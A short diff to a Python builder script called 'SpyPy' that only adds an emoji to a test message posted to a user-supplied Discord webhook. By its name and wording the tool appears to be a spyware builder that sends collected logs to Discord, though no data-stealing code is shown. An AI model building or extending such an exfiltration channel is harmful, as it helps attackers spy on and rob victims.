@@ -105,7 +105,7 @@ def prepare_source():
         webhook_url = input("[SPY-PY BUILDER] Enter the URL of the Discord webhook: ").strip()
         while True:
             data = {
-                "content": "```SpyPy has been configured to send logs to this webhook.```",
+                "content": "```✅ SpyPy has been configured to send logs to this webhook.```",
                 "username": "SpyPy",
             }
             response = requests.post(webhook_url, json=data)
